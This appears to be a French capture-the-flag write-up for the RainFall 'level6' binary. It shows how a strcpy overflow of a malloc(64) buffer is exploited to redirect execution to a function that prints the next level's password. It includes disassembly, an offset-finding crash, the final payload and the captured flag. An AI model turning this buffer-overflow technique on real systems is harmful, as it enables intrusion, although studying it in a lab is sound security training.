@@ -1,0 +1,28 @@
+Ici on se retrouve avec un programme contenant un strcpy utilise avec une input non protege place dans un malloc(64), nous allons donc pouvoir naturellement reecrire l'adresse de retour de la fonction courante afin d'exploiter le programme.
+Il s'avere que nous avons a disposition une fonction n toute prete pour afficher le contenu de level7/.pass
+
+level6@RainFall:~$ objdump -d ./level6 -M intel
+
+./level6:     file format elf32-i386
+	...
+	08048454 <n>:
+ 8048454:	55                   	push   ebp
+ 8048455:	89 e5                	mov    ebp,esp
+ 8048457:	83 ec 18             	sub    esp,0x18
+ 804845a:	c7 04 24 b0 85 04 08 	mov    DWORD PTR [esp],0x80485b0
+ 8048461:	e8 0a ff ff ff       	call   8048370 <system@plt>
+ 8048466:	c9                   	leave
+ 8048467:	c3                   	ret
+	...
+
+Il suffit de trouver l'offset de notre exploit pour ensuite placer notre adresse au bon endroit
+
+level6@RainFall:~$ ./level6 $(python -c 'print("a" * 72 + "bbbb")')
+Segmentation fault (core dumped)
+
+level6@RainFall:~$ dmesg
+	...
+	[16074.751109] level6[4650]: segfault at 62626262 ip 62626262 sp bffff69c error 14
+
+level6@RainFall:~$ ./level6 $(python -c 'print("a" * 72 + "\x54\x84\x04\x08")')
+f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
